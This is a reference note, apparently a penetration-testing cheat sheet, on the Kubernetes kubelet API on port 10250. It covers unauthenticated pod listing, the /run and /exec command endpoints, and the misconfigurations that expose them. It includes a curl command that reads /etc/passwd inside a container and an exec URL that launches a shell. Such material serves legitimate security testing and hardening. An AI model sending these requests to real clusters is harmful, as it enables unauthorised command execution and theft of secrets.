# Kubelet API on Port 10250

## GET /pods (Unauthenticated)

When anonymous auth is enabled (`--anonymous-auth=true`, the default) and authorization is set to `AlwaysAllow` (a common misconfiguration), an unauthenticated GET returns a full `PodList` JSON object:

```json
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {},
  "items": [
    {
      "metadata": {
        "name": "nginx-abc123",
        "namespace": "default",
        ...
      },
      "spec": {
        "containers": [
          {
            "name": "nginx",
            "image": "nginx:1.25",
            ...
          }
        ],
        ...
      },
      "status": {
        "podIP": "10.244.0.5",
        "containerStatuses": [...],
        ...
      }
    }
  ]
}
```

This reveals pod names, namespaces, container names, images, IPs, volumes, env vars (which may contain secrets), and more.

---

## Exec / Run Command Endpoints

### Non-streaming: `POST /run/{namespace}/{pod}/{container}`

Runs a command and returns output directly in the HTTP response body:

```
POST https://<node-ip>:10250/run/<namespace>/<pod-name>/<container-name>?cmd=id
```

Example with curl:

```bash
curl -sk -X POST \
  "https://10.0.0.5:10250/run/default/nginx-abc123/nginx?cmd=cat+/etc/passwd"
```

### Streaming: `POST /exec/{namespace}/{pod}/{container}`

Uses SPDY/HTTP2 upgrade for interactive I/O:

```
POST https://<node-ip>:10250/exec/<namespace>/<pod-name>/<container-name>?command=/bin/sh&command=-c&command=id&stdout=true&stderr=true
```

Query parameters:
| Param | Purpose |
|-------|---------|
| `command` | Repeatable; each occurrence is one argv element |
| `stdin` | `true`/`false` |
| `stdout` | `true`/`false` |
| `stderr` | `true`/`false` |
| `tty` | `true`/`false` |

Requires a `X-Stream-Protocol-Version` header (e.g., `v4.channel.k8s.io`) and a SPDY-capable client.

---

## Other Notable Endpoints

| Path | Method | Purpose |
|------|--------|---------|
| `/containerLogs/{ns}/{pod}/{container}` | GET | Retrieve container logs |
| `/runningpods` | GET | List currently running pods |
| `/portForward/{ns}/{pod}` | POST | Port-forward into a pod |
| `/attach/{ns}/{pod}/{container}` | GET/POST | Attach to a running container |
| `/stats/summary` | GET | Node/container resource stats |
| `/healthz` | GET | Health check (often unauthenticated even on hardened clusters) |

---

## Security Context

By default, kubelet on 10250:
- Requires TLS client certs (`--client-ca-file`)
- Enables anonymous auth (`--anonymous-auth=true`) **but** delegates authorization to the API server's SubjectAccessReview (via `--authorization-mode=Webhook`)

It becomes exploitable when:
- `--authorization-mode=AlwaysAllow` is set
- The webhook authorization fails open
- Older versions had auth bypasses (e.g., CVE-2018-1002105 adjacent issues)

A hardened kubelet returns `401 Unauthorized` or `403 Forbidden` for unauthenticated requests to all of the above.